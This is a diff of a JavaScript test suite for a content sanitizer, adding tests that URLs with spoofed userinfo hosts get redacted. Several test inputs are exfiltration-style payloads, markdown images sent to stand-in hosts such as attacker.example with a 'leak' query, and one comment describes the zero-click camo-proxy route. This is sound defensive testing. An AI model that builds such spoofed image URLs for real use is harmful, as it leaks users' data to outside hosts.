@@ -1289,25 +1289,6 @@ describe("sanitize_content.cjs", () => {
       expect(result).not.toContain("//evil.com");
     });
 
-    it("should redact a protocol-relative URL whose allowlisted host is only userinfo", () => {
-      const result = sanitizeContent("![x](//github.com@evil.com/pixel.gif?leak=SENTINEL)");
-      expect(result).toContain("(evil.com/redacted)");
-      expect(result).not.toContain("evil.com/pixel.gif");
-      expect(result).not.toContain("SENTINEL");
-    });
-
-    it("should redact a protocol-relative URL with userinfo containing a port", () => {
-      const result = sanitizeContent("//github.com:443@evil.com/x");
-      expect(result).toContain("(evil.com/redacted)");
-      expect(result).not.toContain("evil.com/x");
-    });
-
-    it("should redact a protocol-relative URL with chained userinfo segments", () => {
-      const result = sanitizeContent("//a@github.com@evil.com/x");
-      expect(result).toContain("(evil.com/redacted)");
-      expect(result).not.toContain("evil.com/x");
-    });
-
     it("should allow protocol-relative URLs on allowed domains", () => {
       const result = sanitizeContent("Visit //github.com/repo");
       expect(result).toContain("//github.com/repo");
@@ -1398,6 +1379,105 @@ describe("sanitize_content.cjs", () => {
       // "word//evil.com/path" has no delimiter before //, so it should not be caught
       const result = sanitizeContent("word//evil.com/path");
       expect(result).toContain("word//evil.com/path");
+    });
+  });
+
+  describe("URL userinfo authority spoofing", () => {
+    // A URL authority may carry a "userinfo@" prefix. Everything before the last
+    // "@" is credentials, not the host, so "https://github.com@evil.com/x"
+    // connects to evil.com even though the allowlisted "github.com" appears
+    // first. Redaction must key off the real host in every URL form.
+
+    it("should redact an https URL whose allowlisted host is only userinfo", () => {
+      const result = sanitizeContent("https://github.com@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a markdown image whose https host is spoofed via userinfo", () => {
+      // Zero-click exfiltration vector: GitHub's camo proxy fetches image URLs
+      // server-side when the rendered comment is viewed.
+      const result = sanitizeContent("![x](https://github.com@attacker.example/pixel.gif?leak=SENTINEL)");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a protocol-relative URL whose allowlisted host is only userinfo", () => {
+      // Browsers on an HTTPS page resolve //host/path to https://host/path.
+      const result = sanitizeContent("//github.com@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a markdown image whose protocol-relative host is spoofed via userinfo", () => {
+      const result = sanitizeContent("![x](//github.com@attacker.example/pixel.gif?leak=SENTINEL)");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a protocol-relative URL with no path when the host is spoofed", () => {
+      const result = sanitizeContent("//github.com@evil.com");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("github.com@");
+    });
+
+    it("should redact a protocol-relative URL whose userinfo carries a port", () => {
+      const result = sanitizeContent("//github.com:443@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a protocol-relative URL with chained userinfo segments", () => {
+      // The LAST "@" delimits the real host, so every earlier segment is userinfo.
+      const result = sanitizeContent("//a@github.com@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a protocol-relative URL with user:password userinfo", () => {
+      const result = sanitizeContent("//user:SENTINEL_PASSWORD@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("SENTINEL_PASSWORD");
+    });
+
+    it("should redact a spoofed protocol-relative host regardless of case", () => {
+      const result = sanitizeContent("//GitHub.com@EVIL.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("EVIL.com/x");
+    });
+
+    it("should redact a spoofed protocol-relative URL inside an HTML src attribute", () => {
+      const result = sanitizeContent('<img src="//github.com@evil.com/p.png">');
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/p.png");
+    });
+
+    it("should redact every spoofed protocol-relative URL when several appear", () => {
+      const result = sanitizeContent("//github.com@evil.com/a //github.com@bad.org/b");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).toContain("(bad.org/redacted)");
+      expect(result).not.toContain("github.com@");
+    });
+
+    it("should strip userinfo but keep the URL when the real host is allowed", () => {
+      const result = sanitizeContent("//github.com@github.com/ok");
+      expect(result).toContain("//github.com/ok");
+      expect(result).not.toContain("github.com@");
+    });
+
+    it("should not treat an @ in a protocol-relative path as userinfo", () => {
+      const result = sanitizeContent("//github.com/a@b");
+      expect(result).toContain("//github.com/a@b");
+    });
+
+    it("should not treat an @ in a protocol-relative query string as userinfo", () => {
+      const result = sanitizeContent("//github.com/repo?u=a@b.com");
+      expect(result).toContain("//github.com/repo?u=a@b.com");
+    });
+
+    it("should not corrupt // path segments inside an allowed absolute URL", () => {
+      const result = sanitizeContent("https://github.com//issues");
+      expect(result).toContain("https://github.com//issues");
     });
   });
 
